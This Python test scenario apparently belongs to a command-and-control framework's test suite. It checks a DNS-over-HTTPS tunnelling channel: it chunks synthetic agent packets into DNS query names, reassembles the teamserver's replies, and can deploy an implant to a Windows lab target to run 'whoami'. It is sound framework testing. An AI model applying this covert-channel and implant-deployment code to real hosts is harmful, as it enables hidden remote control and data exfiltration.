"""
Scenario 20_agent_doh_dns_listener_interop: DoH query-name interop against the DNS listener

This scenario exercises the Specter/Archon DoH query-name grammar against the
real authoritative DNS listener without depending on a public DoH resolver.
It sends the same query names the agents generate, but directly over UDP to the
teamserver's DNS listener (mirroring scenario 13's raw protocol probe style).

Flow:
  1. Create + start a DNS listener
  2. Upload a synthetic DEMON_INIT packet using DoH-style uplink names
     (multi-chunk — validates chunked reassembly on the teamserver)
  3. Poll `rdy.<session>.d.<domain>` until the init ACK is ready
  4. Download the ACK using DoH-style chunk-fetch names
  5. Upload a synthetic GET_JOB callback and verify the empty response path
  6. Optional: deploy Specter on Windows with an HTTP listener that has
     `doh_domain` / `doh_provider` set (ARC-08) while this DNS listener serves
     the same zone — primary traffic is still HTTP; DoH fallback is compiled in.
     Public DoH resolvers do not resolve private lab names end-to-end; the UDP
     probes above are the authoritative DoH wire-format interop check.
"""

from __future__ import annotations

DESCRIPTION = "DoH query-name interop against the DNS listener (Specter/Archon grammar)"

import base64
import importlib.util
import json
import os
import socket
import struct
import time
import uuid
from pathlib import Path

from lib import ScenarioSkipped


DEFAULT_DNS_TIMEOUT_SECS = 5.0
DOH_CHUNK_BYTES = 37


def _load_protocol_probe_module():
    """Load scenario 13 so we can reuse the Demon packet builders."""
    path = Path(__file__).with_name("13_protocol_compliance.py")
    spec = importlib.util.spec_from_file_location("scenario_13_protocol_compliance", path)
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def _short_id() -> str:
    return uuid.uuid4().hex[:8]


def _random_session_hex() -> str:
    return uuid.uuid4().hex[:16]


def _encode_b32(data: bytes) -> str:
    """Encode bytes using the lowercase RFC 4648 alphabet without padding."""
    return base64.b32encode(data).decode("ascii").rstrip("=").lower()


def _decode_b32(text: str) -> bytes:
    """Decode lowercase RFC 4648 base32 without padding."""
    padded = text.upper()
    padded += "=" * ((8 - (len(padded) % 8)) % 8)
    return base64.b32decode(padded)


def _chunk_packet(packet: bytes) -> list[str]:
    """Split a packet into Specter/Archon-sized DoH chunks."""
    return [_encode_b32(packet[i:i + DOH_CHUNK_BYTES]) for i in range(0, len(packet), DOH_CHUNK_BYTES)]


def _build_uplink_name(chunk: str, seq: int, total: int, session: str, domain: str) -> str:
    return f"{chunk}.{seq:04x}{total:04x}.{session}.u.{domain}"


def _build_ready_name(session: str, domain: str) -> str:
    return f"rdy.{session}.d.{domain}"


def _build_chunk_fetch_name(seq: int, session: str, domain: str) -> str:
    return f"{seq:04x}.{session}.d.{domain}"


def _build_dns_txt_query(query_id: int, qname: str) -> bytes:
    """Construct a minimal DNS TXT query packet."""
    buf = bytearray()
    buf.extend(struct.pack(">H", query_id))
    buf.extend(struct.pack(">H", 0x0100))  # RD=1
    buf.extend(struct.pack(">H", 1))       # QDCOUNT
    buf.extend(b"\x00\x00\x00\x00\x00\x00")
    for label in qname.split("."):
        label_bytes = label.encode("ascii")
        buf.append(len(label_bytes))
        buf.extend(label_bytes)
    buf.append(0)
    buf.extend(struct.pack(">H", 16))      # TXT
    buf.extend(struct.pack(">H", 1))       # IN
    return bytes(buf)


def _parse_dns_response_code(packet: bytes) -> int:
    if len(packet) < 4:
        raise AssertionError("DNS response too short to contain flags")
    flags = struct.unpack(">H", packet[2:4])[0]
    return flags & 0x000F


def _parse_first_txt_answer(packet: bytes) -> str | None:
    """Return the first TXT string from a DNS response packet, if present."""
    if len(packet) < 12:
        return None

    qdcount = struct.unpack(">H", packet[4:6])[0]
    ancount = struct.unpack(">H", packet[6:8])[0]
    pos = 12

    for _ in range(qdcount):
        while pos < len(packet):
            label_len = packet[pos]
            pos += 1
            if label_len == 0:
                break
            if label_len & 0xC0:
                raise AssertionError("compressed question labels are not supported in test parser")
            pos += label_len
        pos += 4

    for _ in range(ancount):
        if pos >= len(packet):
            return None
        if packet[pos] & 0xC0 == 0xC0:
            pos += 2
        else:
            while pos < len(packet):
                label_len = packet[pos]
                pos += 1
                if label_len == 0:
                    break
                pos += label_len

        if pos + 10 > len(packet):
            return None
        rtype, _rclass, _ttl, rdlength = struct.unpack(">HHIH", packet[pos:pos + 10])
        pos += 10
        if pos + rdlength > len(packet):
            return None
        if rtype != 16 or rdlength == 0:
            pos += rdlength
            continue

        txt_len = packet[pos]
        start = pos + 1
        end = start + txt_len
        if end > pos + rdlength:
            return None
        return packet[start:end].decode("utf-8", errors="replace")

    return None


def _send_dns_query(host: str, port: int, qname: str, timeout: float = DEFAULT_DNS_TIMEOUT_SECS) -> bytes:
    """Send one UDP DNS TXT query and return the raw response packet."""
    query_id = int.from_bytes(os.urandom(2), "big")
    packet = _build_dns_txt_query(query_id, qname)

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(packet, (host, port))
        response, _ = sock.recvfrom(4096)

    response_id = struct.unpack(">H", response[:2])[0]
    if response_id != query_id:
        raise AssertionError(
            f"DNS response ID mismatch for {qname!r}: got 0x{response_id:04x}, expected 0x{query_id:04x}"
        )
    return response


def _wait_for_dns_listener(host: str, port: int, domain: str, timeout: int = 15) -> None:
    """Poll the listener until it responds to any DNS TXT query."""
    deadline = time.monotonic() + timeout
    probe_name = f"probe.{_short_id()}.{domain}"
    while time.monotonic() < deadline:
        try:
            _send_dns_query(host, port, probe_name, timeout=1.0)
            return
        except OSError:
            time.sleep(0.25)
    raise TimeoutError(f"DNS listener {host}:{port} did not respond within {timeout}s")


def _upload_packet_via_doh_grammar(host: str, port: int, domain: str, packet: bytes, session: str) -> None:
    """Upload a packet using the Specter/Archon DoH uplink grammar."""
    chunks = _chunk_packet(packet)
    total = len(chunks)
    for seq, chunk in enumerate(chunks):
        qname = _build_uplink_name(chunk, seq, total, session, domain)
        response = _send_dns_query(host, port, qname)
        rcode = _parse_dns_response_code(response)
        if rcode != 3:
            txt = _parse_first_txt_answer(response)
            raise AssertionError(
                f"DoH uplink chunk {seq}/{total} expected NXDOMAIN (rcode=3), got rcode={rcode}, txt={txt!r}"
            )


def _poll_ready_via_doh_grammar(
    host: str,
    port: int,
    domain: str,
    session: str,
    timeout: int = 15,
) -> int:
    """Poll the DoH ready name until the listener publishes a total chunk count."""
    deadline = time.monotonic() + timeout
    qname = _build_ready_name(session, domain)
    while time.monotonic() < deadline:
        response = _send_dns_query(host, port, qname)
        rcode = _parse_dns_response_code(response)
        if rcode == 3:
            time.sleep(0.25)
            continue
        txt = _parse_first_txt_answer(response)
        if txt:
            return int(txt.strip().strip('"'), 16)
        time.sleep(0.25)
    raise TimeoutError(f"Timed out waiting for DoH ready TXT for session {session}")


def _download_response_via_doh_grammar(host: str, port: int, domain: str, session: str, total: int) -> bytes:
    """Download all DoH response chunks and reassemble the payload."""
    chunks = []
    for seq in range(total):
        qname = _build_chunk_fetch_name(seq, session, domain)
        response = _send_dns_query(host, port, qname)
        rcode = _parse_dns_response_code(response)
        if rcode != 0:
            raise AssertionError(f"DoH downlink chunk {seq}/{total} expected NOERROR, got rcode={rcode}")
        txt = _parse_first_txt_answer(response)
        if not txt:
            raise AssertionError(f"DoH downlink chunk {seq}/{total} returned no TXT answer")
        chunks.append(_decode_b32(txt.strip().strip('"')))
    return b"".join(chunks)


def _maybe_specter_doh_agent_pass(
    ctx,
    cli,
    dns_domain: str,
    teamserver_ip: str,
    listeners_cfg: dict,
) -> None:
    """Optionally deploy Specter with HTTP listener config that enables ARC-08 DoH fields.

    Requires a running DNS listener for *dns_domain* (same scenario). Primary C2 is HTTP;
    the payload embeds ``doh_domain`` / ``doh_provider`` for Specter's DoH fallback transport.
    """
    available = set(ctx.env.get("agents", {}).get("available", ["demon"]))
    if "specter" not in available:
        print("  [specter] SKIPPED — 'specter' not listed in agents.available")
        return
    if ctx.windows is None:
        print("  [specter] SKIPPED — ctx.windows is None (no Windows target)")
        return

    co = int(ctx.timeouts.command_output)

    from lib.cli import (
        agent_exec,
        agent_kill,
        listener_create,
        listener_delete,
        listener_start,
        listener_stop,
    )
    from lib.deploy import DeployError, preflight_dns, preflight_ssh
    from lib.deploy_agent import deploy_and_checkin
    from lib.listeners import normalize_callback_host_for_listener

    try:
        preflight_ssh(ctx.windows)
    except DeployError as exc:
        raise ScenarioSkipped(str(exc)) from exc

    try:
        preflight_dns(ctx.windows, dns_domain, teamserver_ip)
    except ScenarioSkipped as exc:
        raise ScenarioSkipped(f"[specter] {exc}") from exc

    uid = _short_id()
    http_name = f"test-doh-http-{uid}"
    win_port = int(listeners_cfg.get("windows_port", 19082))

    # Baked SPECTER_CALLBACK_URL must use [server].callback_host — never rest_url's
    # loopback host, which is only reachable from the Linux test driver.
    explicit_cb = ctx.env.get("server", {}).get("callback_host")
    if not explicit_cb or not str(explicit_cb).strip():
        raise ScenarioSkipped(
            "[specter] server.callback_host must be set in env.toml for the Windows DoH agent pass"
        )
    callback_host = normalize_callback_host_for_listener(str(explicit_cb))
    if callback_host in ("127.0.0.1", "127.0.0.1.", "localhost", "::1"):
        raise ScenarioSkipped(
            "[specter] server.callback_host must be a routable LAN IP for the Windows target "
            f"(got {callback_host!r})"
        )

    inner = {
        "name": http_name,
        "host_bind": "0.0.0.0",
        "port_bind": win_port,
        "hosts": [callback_host],
        "host_rotation": "round-robin",
        "secure": False,
        "uris": ["/"],
        "doh_domain": dns_domain,
        "doh_provider": "cloudflare",
    }
    print(
        f"  [specter] creating HTTP listener {http_name!r} on port {win_port} "
        f"with doh_domain={dns_domain!r}"
    )
    listener_create(cli, http_name, "http", config_json=json.dumps(inner))
    listener_start(cli, http_name)

    agent_id = None
    try:
        agent = deploy_and_checkin(
            ctx,
            cli,
            ctx.windows,
            agent_type="specter",
            fmt="exe",
            listener_name=http_name,
            label="specter-doh",
            windows_prelaunch_probe=True,
        )
        agent_id = agent["id"]

        print("  [specter][cmd] whoami")
        result = agent_exec(cli, agent_id, "whoami", wait=True, timeout=co)
        whoami_out = result.get("output", "").strip()
        assert whoami_out, "whoami returned empty output"
        assert "\\" in whoami_out, (
            f"whoami output {whoami_out!r} does not contain '\\' "
            f"— expected DOMAIN\\username format"
        )
        print(f"  [specter][cmd] whoami passed: {whoami_out!r}")
    finally:
        if agent_id is not None:
            print(f"  [specter][cleanup] killing agent {agent_id}")
            try:
                agent_kill(cli, agent_id)
            except Exception as exc:
                print(f"  [specter][cleanup] agent kill failed (non-fatal): {exc}")

        print(f"  [specter][cleanup] stopping/deleting HTTP listener {http_name!r}")
        try:
            listener_stop(cli, http_name)
        except Exception:
            pass
        try:
            listener_delete(cli, http_name)
        except Exception:
            pass

    print("  [specter] optional DoH-configured agent pass complete")


def run(ctx):
    from urllib.parse import urlparse

    from lib.cli import agent_kill, listener_create, listener_delete, listener_start, listener_stop
    from lib.deploy import DeployError, inject_hosts_entry, preflight_dns, preflight_ssh

    cli = ctx.cli
    listeners_cfg = ctx.env.get("listeners", {})
    server_host = "127.0.0.1"
    dns_port = listeners_cfg.get("dns_port", 15353)
    dns_domain = listeners_cfg.get("dns_domain", "c2.test.local")

    server_url = (
        ctx.env.get("server", {}).get("rest_url")
        or ctx.env.get("server", {}).get("url", "")
    )
    teamserver_ip = urlparse(server_url).hostname or "127.0.0.1"

    if ctx.linux is not None:
        try:
            inject_hosts_entry(ctx.linux, dns_domain, teamserver_ip)
        except DeployError as exc:
            raise ScenarioSkipped(f"cannot inject /etc/hosts entry: {exc}") from exc
        preflight_dns(ctx.linux, dns_domain, teamserver_ip)

    if ctx.windows is not None:
        try:
            preflight_ssh(ctx.windows)
        except DeployError as exc:
            print(f"  [preflight] Windows SSH unreachable — skipping Windows hosts inject: {exc}")
        else:
            try:
                inject_hosts_entry(ctx.windows, dns_domain, teamserver_ip)
            except DeployError as exc:
                raise ScenarioSkipped(f"[windows] cannot inject hosts entry: {exc}") from exc
            preflight_dns(ctx.windows, dns_domain, teamserver_ip)
            print(f"  [preflight] Windows hosts entry for {dns_domain!r} → {teamserver_ip} verified")

    listener_name = f"test-doh-dns-{_short_id()}"
    scenario13 = _load_protocol_probe_module()

    print(
        f"  [listener] creating DNS listener {listener_name!r} on "
        f"{server_host}:{dns_port} for domain {dns_domain!r}"
    )
    listener_create(cli, listener_name, "dns", port=dns_port, domain=dns_domain)
    listener_start(cli, listener_name)
    _wait_for_dns_listener(server_host, dns_port, dns_domain)
    print("  [listener] ready")

    agent_id = None
    try:
        agent_id = int.from_bytes(os.urandom(4), "big")
        while agent_id == 0:
            agent_id = int.from_bytes(os.urandom(4), "big")
        key = os.urandom(scenario13.AES_KEY_LEN)
        iv = os.urandom(scenario13.AES_IV_LEN)

        print(f"  [init] uploading synthetic DEMON_INIT for agent 0x{agent_id:08X}")
        init_packet = scenario13._build_demon_init_packet(agent_id, key, iv)
        init_chunks = _chunk_packet(init_packet)
        assert len(init_chunks) >= 2, (
            "DEMON_INIT must span multiple DoH chunks to validate teamserver chunked reassembly"
        )
        print(
            f"  [init] packet size {len(init_packet)} bytes → {len(init_chunks)} DoH uplink chunks"
        )
        init_session = _random_session_hex()
        _upload_packet_via_doh_grammar(server_host, dns_port, dns_domain, init_packet, init_session)

        print("  [init] waiting for ready poll")
        init_total = _poll_ready_via_doh_grammar(server_host, dns_port, dns_domain, init_session)
        init_ack = _download_response_via_doh_grammar(
            server_host, dns_port, dns_domain, init_session, init_total
        )
        # Init ACK is encrypted at CTR block offset 0; the server then advances
        # the shared offset by `ctr_blocks_for_len(len(init_ack))` blocks for
        # any subsequent monotonic-CTR callback.
        init_plaintext = scenario13._aes_256_ctr_at_offset(key, iv, 0, init_ack)
        expected_plaintext = scenario13._u32le(agent_id)
        assert init_plaintext == expected_plaintext, (
            f"init ACK mismatch: got {init_plaintext.hex()}, expected {expected_plaintext.hex()}"
        )
        print("  [init] ACK decrypted correctly")

        print("  [get-job] uploading synthetic GET_JOB callback")
        get_job_packet = scenario13._build_get_job_packet(agent_id)
        get_job_session = _random_session_hex()
        _upload_packet_via_doh_grammar(server_host, dns_port, dns_domain, get_job_packet, get_job_session)
        get_job_total = _poll_ready_via_doh_grammar(server_host, dns_port, dns_domain, get_job_session)
        get_job_response = _download_response_via_doh_grammar(
            server_host, dns_port, dns_domain, get_job_session, get_job_total
        )
        assert get_job_response == b"", f"GET_JOB with no queued work should return empty response, got {len(get_job_response)} bytes"
        print("  [get-job] empty response path verified")

        _maybe_specter_doh_agent_pass(ctx, cli, dns_domain, teamserver_ip, listeners_cfg)

    finally:
        if agent_id is not None:
            agent_id_hex = f"{agent_id:08X}"
            print(f"  [cleanup] killing synthetic agent {agent_id_hex}")
            try:
                agent_kill(cli, agent_id_hex)
            except Exception as exc:
                print(f"  [cleanup] agent kill failed (non-fatal): {exc}")

        print(f"  [cleanup] stopping/deleting DNS listener {listener_name!r}")
        try:
            listener_stop(cli, listener_name)
        except Exception:
            pass
        try:
            listener_delete(cli, listener_name)
        except Exception:
            pass
        print("  [cleanup] done")
